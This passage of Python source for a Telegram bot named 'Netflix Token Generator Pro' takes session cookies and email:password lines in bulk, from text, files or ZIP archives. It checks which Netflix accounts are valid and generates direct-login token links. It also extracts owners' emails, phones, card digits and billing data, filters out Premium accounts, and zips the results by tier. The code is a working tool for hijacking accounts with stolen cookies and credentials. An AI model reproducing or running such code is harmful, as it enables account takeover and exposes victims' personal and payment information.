                return False, None, None, "Unexpected API response format", None

            error_text = (response.text or "")[:200] or "No response body"
            return False, None, None, f"HTTP {response.status_code}: {error_text}", None

        except requests.exceptions.Timeout:
            return False, None, None, f"Request timeout after {REQUEST_TIMEOUT}s", None
        except requests.exceptions.ConnectionError:
            return False, None, None, "Connection error, check network", None
        except requests.exceptions.RequestException as e:
            return False, None, None, f"Request error: {e}", None
        except json.JSONDecodeError:
            return False, None, None, "Invalid JSON response from API", None
        except Exception as e:
            logging.error(f"Unexpected error in generate_token: {e}")
            return False, None, None, f"Unexpected error: {e}", None

    def process_item(self, item: Dict[str, Any]) -> CheckResult:
        result = CheckResult(
            cookies_used={k: v for k, v in item.items() if not k.startswith('_')},
            format_type=item.get('_format', 'unknown'),
            source_file=item.get('_source', 'unknown'),
            source_line=item.get('_source_line'),
            request_id=RequestIDGenerator.generate("CHK")
        )
        start_time = time.time()
        try:
            with self.stats_lock:
                self.total_processed += 1
            if item.get('_needs_login'):
                result.success = False
                result.error = "Email:pass login requires browser automation"
                result.error_code = "LOGIN_REQUIRED"
            else:
                success, token, account_details, error, expires = self.generate_token(item)
                result.success = success
                result.account_details = account_details
                result.error = error
                result.expires = expires or ""
                if token and token.startswith("http"):
                    result.login_url = token
                    result.token = token
                else:
                    result.token = token
                if error:
                    if "timeout" in error.lower():
                        result.error_code = "TIMEOUT"
                    elif "connection" in error.lower():
                        result.error_code = "CONNECTION_ERROR"
                    elif "missing" in error.lower():
                        result.error_code = "MISSING_COOKIES"
                    elif "API" in error:
                        result.error_code = "API_ERROR"
                    else:
                        result.error_code = "UNKNOWN_ERROR"
        except Exception as e:
            result.success = False
            result.error = str(e)
            result.error_code = "EXCEPTION"
            logging.error(f"Error processing item: {e}")
            logging.debug(traceback.format_exc())
        result.processing_time = time.time() - start_time
        return result

# ==================== HELPERS ====================
def _format_cookie_str(cookies: Dict[str, str]) -> str:
    """Return a compact NetflixId=v%3D3%26ct%3D... display string.

    Only the NetflixId cookie is shown (URL-encoded format).
    If the stored value already has the v%3D3%26ct%3D prefix it is used as-is;
    otherwise it is wrapped so the result always looks like:
        NetflixId=v%3D3%26ct%3DTOKEN...
    """
    nf_val = cookies.get("NetflixId", "")
    if not nf_val:
        # Fall back: show SecureNetflixId if present, else first non-_ key
        nf_val = cookies.get("SecureNetflixId", "")
        if not nf_val:
            for k, v in cookies.items():
                if not k.startswith('_'):
                    return f"{k}={v}"
            return ""
        return f"SecureNetflixId={nf_val}"
    # If the value doesn't yet have the v=3&ct= URL-encoded prefix, add it
    if not (nf_val.startswith("v%3D") or nf_val.startswith("v=")):
        from urllib.parse import quote
        nf_val = quote(f"v=3&ct={nf_val}", safe="")
    return f"NetflixId={nf_val}"


def _tier_folder(account_details) -> str:
    """Return the subfolder name for a given account's subscription tier."""
    if account_details is None:
        return "Free"
    tier = account_details.subscription_tier
    if tier in (SubscriptionTier.PREMIUM, SubscriptionTier.PREMIUM_4K):
        return "Premium"
    if tier == SubscriptionTier.STANDARD:
        return "Standard"
    if tier == SubscriptionTier.BASIC:
        return "Basic"
    return "Free"


def _build_tier_zip(results: list) -> io.BytesIO:
    """Build a ZIP with Premium/ Standard/ Basic/ Free/ subfolders.

    Each successful result gets its own .txt file containing the cookie
    (in NetflixId= format) and account info.
    """
    buf = io.BytesIO()
    counters: Dict[str, int] = {"Premium": 0, "Standard": 0, "Basic": 0, "Free": 0}

    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for r in results:
            if not r.success or not r.token:
                continue

            folder = _tier_folder(r.account_details)
            counters[folder] = counters.get(folder, 0) + 1
            idx = counters[folder]

            ad = r.account_details
            email = (ad.email or "unknown").replace("/", "_").replace("\\", "_") if ad else "unknown"
            country = (ad.country or "XX") if ad else "XX"
            fname = f"{folder}/{idx:03d}_{email}_{country}.txt"

            cookie_str = _format_cookie_str(r.cookies_used) if r.cookies_used else ""
            mobile_link = f"https://netflix.com/unsupported?nftoken={r.token}"
            pc_link     = f"https://netflix.com/account?nftoken={r.token}"

            lines = []
            lines.append("=" * 60)
            lines.append(f"NETFLIX ACCOUNT - {folder.upper()}")
            lines.append("=" * 60)
            lines.append("")
            lines.append("=== LOGIN LINKS ===")
            lines.append(f"Mobile : {mobile_link}")
            lines.append(f"PC     : {pc_link}")
            if r.expires:
                lines.append(f"Expires: {r.expires}")
            lines.append("")
            lines.append("=== ACCOUNT INFO ===")
            if ad:
                lines.append(f"Email         : {ad.email or 'N/A'}")
                lines.append(f"Country       : {ad.country or 'N/A'}")
                lines.append(f"Plan          : {ad.plan_type or (ad.subscription_tier.value.capitalize() if ad.subscription_tier else 'N/A')}")
                lines.append(f"Price         : {ad.plan_price or 'N/A'}")
                lines.append(f"Quality       : {ad.quality or 'N/A'}")
                lines.append(f"Max Streams   : {ad.max_streams}")
                lines.append(f"Profiles      : {ad.profile_count}")
                if ad.profile_names:
                    lines.append(f"Profile Names : {', '.join(ad.profile_names)}")
                lines.append(f"Member Since  : {ad.member_since.strftime('%Y-%m-%d') if ad.member_since else 'N/A'}")
                lines.append(f"Next Billing  : {ad.next_billing.strftime('%Y-%m-%d') if ad.next_billing else 'N/A'}")
                lines.append(f"Status        : {'Active' if ad.is_active else 'Inactive'}")
                lines.append(f"On Hold       : {'Yes' if ad.on_hold else 'No'}")
                lines.append(f"Email Verified: {'Yes' if ad.email_verified else 'No'}")
                lines.append(f"Payment       : {ad.payment_method or 'N/A'}")
                if ad.card_last4:
                    lines.append(f"Card          : **** **** **** {ad.card_last4}  ({ad.card_type or ''})")
                lines.append(f"Phone         : {ad.phone or 'N/A'}")
                lines.append(f"Extra Member  : {'Yes' if ad.has_extra_member else 'No'}")
            lines.append(f"Source        : {r.source_file or 'N/A'}")
            lines.append(f"Format        : {r.format_type}")
            lines.append(f"Processed     : {r.timestamp.strftime('%Y-%m-%d %H:%M:%S')}")
            lines.append("")
            lines.append("=== COOKIE ===")
            lines.append(cookie_str)
            lines.append("")

            zf.writestr(fname, "\n".join(lines))

        # Write README in each non-empty folder
        for folder, count in counters.items():
            if count > 0:
                zf.writestr(
                    f"{folder}/README.txt",
                    f"{folder} accounts: {count}\nGenerated by Netflix Token Bot\n"
                )

    buf.seek(0)
    return buf


# ==================== OUTPUT FORMATTER ====================
class PremiumOutputFormatter:
    @staticmethod
    def format_premium_account(
        source_file: str,
        account_details: AccountDetails,
        token: str,
        cookies: Dict[str, str],
        mode: str = "Full Information"
    ) -> str:
        # Check if we have valid account details
        if not account_details or not account_details.is_active:
            expiry = TokenExpiryCalculator.calculate_expiry()
            cookie_str = _format_cookie_str(cookies)
            return (
                "⚠️ **PARTIAL ACCOUNT DATA** ⚠️\n\n"
                f"📁 **Source:** `{source_file}`\n"
                f"⚠️ **Status:** `Token Generated but Account Details Unavailable`\n\n"
                "🔑 **Token Information:**\n"
                f"• **Generated:** `{expiry['generated']}`\n"
                f"• **Expires:** `{expiry['expires']}`\n"
                f"• **Remaining:** `{expiry['remaining']}`\n"
                f"• **Phone Login:** [Click to login]({token if token.startswith('http') else f'https://netflix.com/unsupported?nftoken={token}'})\n"
                f"• **PC Login:** [Click to Login]({token if token.startswith('http') else f'https://netflix.com/account?nftoken={token}'})\n\n"
                f"🍪 **Cookie:** `{cookie_str}`\n\n"
                "⚠️ **Note:** Account details could not be fetched. The cookie may be:\n"
                "• Expired or invalid\n"
                "• From a region with restricted access\n"
                "• Missing required permissions\n"
                "• Blocked by Netflix security\n\n"
                f"📊 **Account Filter:** `Premium Only`\n"
                f"🎯 **Mode:** `{mode}`"
            )

        flag = CountryFlagMapper.get_flag(account_details.country or "US")
        country_name = CountryFlagMapper.get_country_name(account_details.country or "US")
        expiry = TokenExpiryCalculator.calculate_expiry()

        profiles = account_details.profile_names or []
        if account_details.profile_name and account_details.profile_name not in profiles:
            profiles.insert(0, account_details.profile_name)
        profiles_str = ", ".join(profiles) if profiles else "None"

        # Price mapping (fallback)
        prices = {
            'IN': {'Basic': '₹199', 'Standard': '₹499', 'Premium': '₹649', 'Premium_4K': '₹649'},
            'US': {'Basic': '$9.99', 'Standard': '$15.49', 'Premium': '$19.99', 'Premium_4K': '$19.99'},
            'GB': {'Basic': '£6.99', 'Standard': '£10.99', 'Premium': '£15.99', 'Premium_4K': '£15.99'},
            'CA': {'Basic': 'CA$9.99', 'Standard': 'CA$16.49', 'Premium': 'CA$20.99', 'Premium_4K': 'CA$20.99'},
            'AU': {'Basic': 'AU$10.99', 'Standard': 'AU$16.99', 'Premium': 'AU$22.99', 'Premium_4K': 'AU$22.99'},
            'DE': {'Basic': '€7.99', 'Standard': '€12.99', 'Premium': '€17.99', 'Premium_4K': '€17.99'},
            'FR': {'Basic': '€8.99', 'Standard': '€13.99', 'Premium': '€17.99', 'Premium_4K': '€17.99'},
            'JP': {'Basic': '¥990', 'Standard': '¥1490', 'Premium': '¥1980', 'Premium_4K': '¥1980'},
            'BR': {'Basic': 'R$25.90', 'Standard': 'R$39.90', 'Premium': 'R$55.90', 'Premium_4K': 'R$55.90'},
            'MX': {'Basic': 'MX$139', 'Standard': 'MX$219', 'Premium': 'MX$299', 'Premium_4K': 'MX$299'},
            'PH': {'Basic': '₱299', 'Standard': '₱499', 'Premium': '₱649', 'Premium_4K': '₱649'},
        }
        country_prices = prices.get(account_details.country or 'US', prices['US'])
        plan_key = account_details.subscription_tier.value.capitalize() if account_details.subscription_tier else 'Basic'
        price = account_details.plan_price or country_prices.get(plan_key, 'Unknown')

        quality_map = {
            SubscriptionTier.BASIC: 'HD720p',
            SubscriptionTier.STANDARD: 'Full HD1080p',
            SubscriptionTier.PREMIUM: 'Ultra HD4K',
            SubscriptionTier.PREMIUM_4K: 'Ultra HD4K',
            SubscriptionTier.AD_SUPPORTED: 'HD720p',
            SubscriptionTier.UNKNOWN: 'Unknown'
        }
        streams_map = {
            SubscriptionTier.BASIC: '1',
            SubscriptionTier.STANDARD: '2',
            SubscriptionTier.PREMIUM: '4',
            SubscriptionTier.PREMIUM_4K: '4',
            SubscriptionTier.AD_SUPPORTED: '1',
            SubscriptionTier.UNKNOWN: '1'
        }

        member_since = account_details.member_since.strftime('%B %Y') if account_details.member_since else 'Unknown'
        if account_details.next_billing:
            next_billing = account_details.next_billing.strftime('%d %B %Y')
        elif account_details.member_since:
            next_billing = (account_details.member_since + timedelta(days=365)).strftime('%d %B %Y')
        else:
            next_billing = 'Unknown'

        card_info = f"{account_details.card_type or 'Unknown'} •••• {account_details.card_last4 or 'Unknown'}" if account_details.card_type else 'Unknown •••• Unknown'
        phone_str = f"{account_details.phone or 'Unknown'} ({'Yes' if account_details.phone_verified else 'No'})"
        hold_status = 'Yes' if account_details.on_hold else 'No'
        extra_member = 'Yes' if account_details.has_extra_member else 'No'
        extra_member_slots = str(account_details.extra_member_slots) if account_details.extra_member_slots > 0 else 'Unknown'
        email_verified = 'Yes' if account_details.email_verified else 'No'
        membership_status = account_details.status.value.upper() if account_details.status else 'CURRENT_MEMBER'

        output_lines = [
            "🌟 **PREMIUM ACCOUNT** 🌟",
            "",
            f"📁 **Source:** `{source_file}`",
            f"✅ **Status:** `Valid Premium Account`",
            "",
            "👤 **Account Details:**",
            f"• **Name:** `{account_details.profile_name or account_details.primary_profile or 'Unknown'}`",
            f"• **Email:** `{account_details.email or cookies.get('email', 'Unknown')}`",
            f"• **Country:** `{country_name} {flag} ({account_details.country or 'Unknown'})`",
            f"• **Plan:** `{account_details.plan_type or account_details.subscription_tier.value.capitalize() if account_details.subscription_tier else 'Unknown'}`",
            f"• **Price:** `{price}`",
            f"• **Member Since:** `{member_since}`",
            f"• **Next Billing:** `{next_billing}`",
            f"• **Payment:** `{account_details.payment_method or 'Unknown'}`",
            f"• **Card:** `{card_info}`",
            f"• **Phone:** `{phone_str}`",
            f"• **Quality:** `{quality_map.get(account_details.subscription_tier, 'Unknown')}`",
            f"• **Streams:** `{streams_map.get(account_details.subscription_tier, '1')}`",
            f"• **Hold Status:** `{hold_status}`",
            f"• **Extra Member:** `{extra_member}`",
            f"• **Extra Member Slot:** `{extra_member_slots}`",
            f"• **Email Verified:** `{email_verified}`",
            f"• **Membership Status:** `{membership_status}`",
            f"• **Connected Profiles:** `{account_details.profile_count}`",
            f"• **Profiles:** `{profiles_str}`",
            "",
            "🔑 **Token Information:**",
            f"• **Generated:** `{expiry['generated']}`",
            f"• **Expires:** `{expiry['expires']}`",
            f"• **Remaining:** `{expiry['remaining']}`",
            f"• **Phone Login:** [Click to login]({token if token.startswith('http') else f'https://netflix.com/unsupported?nftoken={token}'})",
            f"• **PC Login:** [Click to Login]({token if token.startswith('http') else f'https://netflix.com/account?nftoken={token}'})",
            "",
            "🍪 **Cookie:** "
        ]
        cookie_str = _format_cookie_str(cookies)
        output_lines.append(f"`{cookie_str}`")
        output_lines.append("")
        output_lines.append(f"📊 **Account Filter:** `Premium Only`")
        output_lines.append(f"🎯 **Mode:** `{mode}`")
        return "\n".join(output_lines)

    @staticmethod
    def format_batch_report(batch_result: BatchResult) -> str:
        output = []
        output.append("📊 **BATCH PROCESSING REPORT**")
        output.append("=" * 50)
        output.append("")
        output.append(f"📁 **File:** `{batch_result.file_name or 'Unknown'}`")
        output.append(f"⏱️ **Started:** `{batch_result.start_time.strftime('%Y-%m-%d %H:%M:%S')}`")
        if batch_result.end_time:
            output.append(f"⏱️ **Completed:** `{batch_result.end_time.strftime('%Y-%m-%d %H:%M:%S')}`")
            total_time = (batch_result.end_time - batch_result.start_time).total_seconds()
            output.append(f"⏱️ **Total Time:** `{total_time:.2f}s`")
        output.append("")
        output.append("📈 **STATISTICS**")
        output.append(f"• **Total Processed:** `{batch_result.total}`")
        output.append(f"• **✅ Successful:** `{batch_result.success}`")
        output.append(f"• **❌ Failed:** `{batch_result.failed}`")
        output.append(f"• **💎 Premium:** `{batch_result.premium}`")
        output.append(f"• **📺 Standard:** `{batch_result.standard}`")
        output.append(f"• **📱 Basic:** `{batch_result.basic}`")
        output.append(f"• **❓ Unknown:** `{batch_result.unknown}`")
        output.append(f"• **⚡ Avg Time:** `{batch_result.avg_time:.2f}s`")
        output.append(f"• **📊 Success Rate:** `{(batch_result.success/batch_result.total*100 if batch_result.total else 0):.1f}%`")
        output.append("")
        output.append("📋 **DETAILED RESULTS**")
        output.append("-" * 50)

        for i, result in enumerate(batch_result.results, 1):
            output.append("")
            output.append(f"**[{i}] {result.source_file or 'Unknown'}**")
            if result.success:
                token_disp = result.token[:50] + "..." if result.token and len(result.token) > 50 else result.token
                output.append(f"   ✅ **Token:** `{token_disp}`")
                if result.account_details:
                    tier = result.account_details.subscription_tier.value.upper()
                    tier_emoji = "💎" if "PREMIUM" in tier else "📺" if "STANDARD" in tier else "📱"
                    output.append(f"   {tier_emoji} **Tier:** `{tier}`")
                    if result.account_details.country:
                        flag = CountryFlagMapper.get_flag(result.account_details.country)
                        output.append(f"   🌍 **Country:** `{result.account_details.country} {flag}`")
                    if result.account_details.profile_name:
                        output.append(f"   👤 **Profile:** `{result.account_details.profile_name}`")
                    if result.account_details.profile_count:
                        output.append(f"   📺 **Profiles:** `{result.account_details.profile_count}`")
            else:
                output.append(f"   ❌ **Error:** `{result.error or 'Unknown error'}`")
                if result.error_code:
                    output.append(f"   ⚠️ **Code:** `{result.error_code}`")
            output.append(f"   ⏱️ **Time:** `{result.processing_time:.2f}s`")
            output.append(f"   📁 **Format:** `{result.format_type}`")
        return "\n".join(output)

# ==================== BOT CLASS ====================
class NetflixTokenBot:
    def __init__(self, token: str):
        self.token = token
        self.processor = NetflixTokenGenerator()
        self.stats = BotStats()
        self.formatter = PremiumOutputFormatter()
        self.application = None
        self.active_tasks: Dict[int, Dict[str, Any]] = {}
        self.shutdown_event = threading.Event()

        if not TELEGRAM_AVAILABLE:
            print("⚠️ Running in test mode without Telegram")

    def get_keyboard(self):
        if not TELEGRAM_AVAILABLE:
            return None
        keyboard = [
            [
                InlineKeyboardButton("🎬 Token Only", callback_data="tokenonly"),
                InlineKeyboardButton("📊 Full Info", callback_data="fullinfo")
            ],
            [
                InlineKeyboardButton("⚡ Batch Process", callback_data="batch"),
                InlineKeyboardButton("📈 Stats", callback_data="stats")
            ],
            [
                InlineKeyboardButton("❓ Help", callback_data="help"),
                InlineKeyboardButton("🛑 Cancel", callback_data="cancel")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        self.stats.add_user(user.id)
        stats = self.stats.get_stats_summary()

        welcome_text = (
            f"🎬 **Netflix Token Generator Pro v{BOT_VERSION}** 🚀\n\n"
            f"✨ **Features:**\n"
            f"• 🍪 Extract NetflixId from ANY format\n"
            f"• 🔍 Check account validity & details\n"
            f"• 🔑 Generate Direct Login tokens\n"
            f"• 💎 Filter Premium accounts only\n"
            f"• ⚡ Multi-threaded processing (10x faster)\n"
            f"• 📊 Detailed analytics & reporting\n\n"
            f"📁 **Supported Formats:**\n"
            f"• Text files (.txt)\n"
            f"• JSON files (.json)\n"
            f"• ZIP archives\n"
            f"• Header strings\n"
            f"• Netscape format\n"
            f"• URL-encoded cookies\n"
            f"• Email:Password format\n\n"
            f"⚡ **Quick Commands:**\n"
            f"`/start` - Show this message\n"
            f"`/tokenonly` - Token info only\n"
            f"`/fullinfo` - Full account details\n"
            f"`/batch` - Batch process files\n"
            f"`/stats` - Bot statistics\n"
            f"`/cancel` - Stop current task\n\n"
            f"📈 **Current Stats:**\n"
            f"• {stats['total_users']}+ Active Users\n"
            f"• {stats['success_rate']:.1f}% Success Rate\n"
            f"• {stats['premium_accounts']} Premium Accounts Found\n"
            f"• ⚡ Avg Response: {stats['avg_response_time']:.2f}s\n\n"
            f"👋 Welcome, {user.first_name}! Ready to generate tokens."
        )

        await update.message.reply_text(
            welcome_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=self.get_keyboard()
        )

    async def tokenonly(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['mode'] = 'tokenonly'
        await update.message.reply_text(
            "🔑 **Token Only Mode Activated**\n\n"
            "Send me cookies in any format, and I'll return just the NFToken.\n"
            "Fastest processing - no account details fetched.",
            parse_mode=ParseMode.MARKDOWN
        )

    async def fullinfo(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['mode'] = 'fullinfo'
        await update.message.reply_text(
            "📊 **Full Info Mode Activated**\n\n"
            "Send me cookies, and I'll return:\n"
            "• NFToken\n"
            "• Subscription tier\n"
            "• Account country\n"
            "• Profile info\n"
            "• Member since\n"
            "• Premium status\n"
            "• And much more...",
            parse_mode=ParseMode.MARKDOWN
        )

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        stats = self.stats.get_stats_summary()
        stats_text = (
            "📊 **Bot Statistics**\n\n"
            f"👥 **Total Users:** `{stats['total_users']}`\n"
            f"📅 **Active Today:** `{stats['active_today']}`\n"
            f"✅ **Total Checks:** `{stats['total_checks']}`\n"
            f"📈 **Success Rate:** `{stats['success_rate']:.1f}%`\n"
            f"💎 **Premium Found:** `{stats['premium_accounts']}`\n"
            f"⏱️ **Uptime:** `{stats['uptime']}`\n"
            f"⚡ **Avg Response:** `{stats['avg_response_time']:.2f}s`\n"
            f"📅 **Today:** `{stats['checks_today']}` checks\n"
            f"📁 **Files Processed:** `{stats['total_files']}`\n"
            f"📦 **Batches:** `{stats['total_batches']}`\n\n"
            "📁 **Format Breakdown:**\n" +
            '\n'.join([f"• `{fmt}`: `{count}`" for fmt, count in stats['format_breakdown'].items()]) +
            "\n\n❌ **Top Errors:**\n" +
            ('\n'.join([f"• `{err}`: `{count}`" for err, count in stats['error_breakdown'].items()]) or "• None")
        )
        await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)

    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        task = self.active_tasks.get(user_id)
        if task and not task.get('cancelled', False):
            task['cancelled'] = True
            task['cancel'] = True
            await update.message.reply_text("🛑 Cancellation requested. Stopping...")
        else:
            await update.message.reply_text("No active task to cancel.")

    async def batch_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        mode = context.user_data.get('mode', 'tokenonly')
        context.user_data['batch_mode'] = True
        context.user_data['batch_source'] = None
        await update.message.reply_text(
            f"📁 **Batch Mode Activated**\n"
            f"📊 **Mode:** `{mode}`\n\n"
            "Send me a **.txt file**, **.zip file**, or **plain text** (one item per line).\n"
            "I'll process each line and show live progress.\n"
            "Use /cancel to stop.",
            parse_mode=ParseMode.MARKDOWN
        )

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.user_data.get('batch_mode'):
            await update.message.reply_text("❌ Please use /batch first.")
            return

        context.user_data['batch_mode'] = False
        file = update.message.document
        user_id = update.effective_user.id

        if user_id in self.active_tasks:
            await update.message.reply_text("❌ A task is already running. Use /cancel to stop it first.")
            return

        if file.file_size > MAX_FILE_SIZE:
            await update.message.reply_text(f'❌ File too large. Max: {MAX_FILE_SIZE//1024//1024}MB')
            return

        status_msg = await update.message.reply_text("📥 Downloading file...")

        try:
            telegram_file = await file.get_file()
            content = io.BytesIO()
            await telegram_file.download_to_memory(content)
            content.seek(0)

            all_items = []
            if file.file_name.endswith('.zip'):
                with zipfile.ZipFile(content) as zf:
                    for name in zf.namelist():
                        if name.endswith('.txt') or name.endswith('.json'):
                            with zf.open(name) as f:
                                text = f.read().decode('utf-8', errors='ignore')
                                items = self.processor.extract_all_formats(text)
                                for it in items:
                                    it['_source'] = f"{file.file_name}/{name}"
                                    all_items.append(it)
            else:
                text = content.read().decode('utf-8', errors='ignore')
                items = self.processor.extract_all_formats(text)
                for it in items:
                    it['_source'] = file.file_name
                    all_items.append(it)

            if not all_items:
                await status_msg.edit_text("❌ No valid cookies found in the file.")
                return

            mode = context.user_data.get('mode', 'fullinfo')
            await self._process_batch(
                update, context, user_id, all_items, mode,
                f"File: {file.file_name}", status_msg
            )

        except Exception as e:
            await status_msg.edit_text(f"❌ Error reading file: {str(e)}")
            logging.error(traceback.format_exc())

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.user_data.get('batch_mode'):
            await self._handle_single(update, context)
            return

        context.user_data['batch_mode'] = False
        user_id = update.effective_user.id
        text = update.message.text

        if user_id in self.active_tasks:
            await update.message.reply_text("❌ A task is already running. Use /cancel to stop it first.")
            return

        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text("❌ No non‑empty lines found.")
            return

        all_items = []
        for line in lines:
            items = self.processor.extract_all_formats(line)
            all_items.extend(items)

        if not all_items:
            await update.message.reply_text("❌ No valid cookie lines found.")
            return

        mode = context.user_data.get('mode', 'fullinfo')
        status_msg = await update.message.reply_text("📥 Preparing batch...")
        await self._process_batch(
            update, context, user_id, all_items, mode,
            "Text input", status_msg
        )

    async def _handle_single(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message or not update.message.text:
            return

        text = update.message.text
        mode = context.user_data.get('mode', 'fullinfo')
        self.stats.update_concurrent(1)

        try:
            await update.message.chat.send_action(action="typing")
            items = self.processor.extract_all_formats(text)
            if not items:
                await update.message.reply_text(
                    "❌ **No valid Netflix credentials found**\n\n"
                    "Supported formats:\n"
                    "• Netscape cookies\n"
                    "• Raw cookie strings\n"
                    "• JSON objects\n"
                    "• Header strings\n"
                    "• URL-encoded cookies\n"
                    "• Email:Password",
                    parse_mode=ParseMode.MARKDOWN
                )
                return

            item = items[0]
            format_type = item.get('_format', 'unknown')
            result = self.processor.process_item(item)

            self.stats.record_check(
                result.success,
                result.account_details and result.account_details.subscription_tier in [SubscriptionTier.PREMIUM, SubscriptionTier.PREMIUM_4K],
                format_type,
                result.error_code,
                result.processing_time
            )

            if result.success and result.token:
                if mode == 'tokenonly':
                    tok = result.token or ""
                    mobile_link = f"https://netflix.com/unsupported?nftoken={tok}"
                    pc_link     = f"https://netflix.com/account?nftoken={tok}"
                    response = (
                        f"✅ **Token Generated!**\n\n"
                        f"📱 **Mobile:** {mobile_link}\n"
                        f"🖥 **PC:** {pc_link}\n"
                        f"**Format:** `{format_type}`\n"
                        f"**Time:** `{result.processing_time:.2f}s`"
                    )
                    if result.expires:
                        response += f"\n**Expires:** `{result.expires}`"
                    if result.account_details and result.account_details.subscription_tier != SubscriptionTier.UNKNOWN:
                        tier_emoji = "💎" if result.account_details.subscription_tier in [SubscriptionTier.PREMIUM, SubscriptionTier.PREMIUM_4K] else "📺"
                        response += f"\n**Tier:** {tier_emoji} `{result.account_details.subscription_tier.value.upper()}`"
                    await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)
                else:
                    output = PremiumOutputFormatter.format_premium_account(
                        source_file='Direct Input',
                        account_details=result.account_details or AccountDetails(),
                        token=result.token,
                        cookies=result.cookies_used,
                        mode='Full Information'
                    )
                    await update.message.reply_text(output, parse_mode=ParseMode.MARKDOWN)
            else:
                error_msg = result.error or "Unknown error"
                await update.message.reply_text(
                    f"❌ **Failed!**\n\n"
                    f"**Error:** `{error_msg}`\n"
                    f"**Code:** `{result.error_code or 'N/A'}`\n"
                    f"**Format:** `{format_type}`\n"
                    f"**Time:** `{result.processing_time:.2f}s`",
                    parse_mode=ParseMode.MARKDOWN
                )
        except Exception as e:
            logging.error(f"Error in _handle_single: {e}")
            logging.debug(traceback.format_exc())
            await update.message.reply_text(f"❌ **Error:** `{str(e)}`", parse_mode=ParseMode.MARKDOWN)
        finally:
            self.stats.update_concurrent(-1)

    async def _process_batch(self, update: Update, context: ContextTypes.DEFAULT_TYPE,
                             user_id: int, items: List[Dict], mode: str,
                             source_desc: str, status_msg):
        total = len(items)
        start_time = time.time()
        results = []
        valid = 0
        invalid = 0
        errors = 0

        self.active_tasks[user_id] = {
            'cancel': False,
            'cancelled': False,
            'processed': 0
        }

        await self._update_progress(status_msg, 0, total, valid, invalid, errors,
                                     source_desc, mode, start_time)

        for idx, item in enumerate(items, 1):
            if self.active_tasks[user_id].get('cancel', False):
                elapsed = time.time() - start_time
                cancel_text = (
                    f"🚫 **Task Successfully Cancelled**\n\n"
                    f"Processed: {idx-1}/{total}\n"
                    f"Status: Cancellation complete\n"
                    f"Duration: {elapsed:.1f}s\n\n"
                    f"Bot is now ready for new tasks."
                )
                await status_msg.edit_text(cancel_text, parse_mode=ParseMode.MARKDOWN)
                del self.active_tasks[user_id]
                return

            result = await asyncio.get_event_loop().run_in_executor(
                None, self.processor.process_item, item
            )
            results.append(result)

            if result.success and result.token:
                valid += 1
                if mode == 'fullinfo':
                    output = PremiumOutputFormatter.format_premium_account(
                        source_file=result.source_file or source_desc,
                        account_details=result.account_details or AccountDetails(),
                        token=result.token,
                        cookies=result.cookies_used,
                        mode='Full Information'
                    )
                    await update.message.reply_text(output, parse_mode=ParseMode.MARKDOWN)
                    await asyncio.sleep(0.3)
                elif mode == 'tokenonly':
                    tok = result.token or ""
                    mobile_link = f"https://netflix.com/unsupported?nftoken={tok}"
                    pc_link     = f"https://netflix.com/account?nftoken={tok}"
                    msg = f"✅ **Mobile:** {mobile_link}\n🖥 **PC:** {pc_link}"
                    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
                    await asyncio.sleep(0.2)
            elif result.error:
                # Only real system failures count as errors; cookie issues are invalid
                if result.error_code in ('TIMEOUT', 'CONNECTION_ERROR', 'EXCEPTION'):
                    errors += 1
                else:
                    invalid += 1
            else:
                invalid += 1

            if idx % 3 == 0 or idx == total:
                await self._update_progress(status_msg, idx, total, valid, invalid, errors,
                                             source_desc, mode, start_time)

            await asyncio.sleep(0)

        elapsed = time.time() - start_time
        del self.active_tasks[user_id]

        final_text = (
            f"✅ **Done**\n\n"
            f"Duration: {elapsed:.1f}s\n"
            f"Total items: {total}\n"
            f"✅ Valid: {valid}\n"
            f"❌ Invalid: {invalid}\n"
            f"⚠️ Errors: {errors}\n\n"
            f"Detailed report attached below."
        )
        await status_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN)

        ts = datetime.now().strftime('%Y%m%d_%H%M%S')

        # Build tier-organised ZIP (Premium / Standard / Basic / Free subfolders)
        tier_zip = _build_tier_zip(results)
        await update.message.reply_document(
            document=tier_zip,
            filename=f"netflix_cookies_{ts}.zip",
            caption=(
                f"📦 **Batch Results ZIP**\n"
                f"Folders: Premium / Standard / Basic / Free\n"
                f"Each .txt file contains cookie + account info\n\n"
                f"✅ Valid: {valid}  ❌ Invalid: {invalid}  ⚠️ Errors: {errors}"
            )
        )

    @staticmethod
    async def _update_progress(status_msg, current, total, valid, invalid, errors,
                                source_desc, mode, start_time):
        percent = (current / total) * 100 if total else 0
        bar_length = 10
        filled = int(bar_length * percent / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        elapsed = time.time() - start_time
        text = (
            f"**Processing Progress**\n\n"
            f"Mode: {mode} ({source_desc})\n"
            f"Total Items: {total}\n"
            f"Progress: [{bar}] {percent:.1f}%\n"
            f"Processed: {current}/{total}\n"
            f"✅ Valid: {valid}\n"
            f"❌ Invalid: {invalid}\n"
            f"⚠️ Errors: {errors}\n"
            f"⏱️ Elapsed: {elapsed:.1f}s\n\n"
            f"Use /cancel to stop this task"
        )
        await status_msg.edit_text(text, parse_mode=ParseMode.MARKDOWN)

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()

        if query.data == "tokenonly":
            context.user_data['mode'] = 'tokenonly'
            await query.edit_message_text("🔑 **Token Only Mode Activated**\n\nSend me cookies!", parse_mode=ParseMode.MARKDOWN)
        elif query.data == "fullinfo":
            context.user_data['mode'] = 'fullinfo'
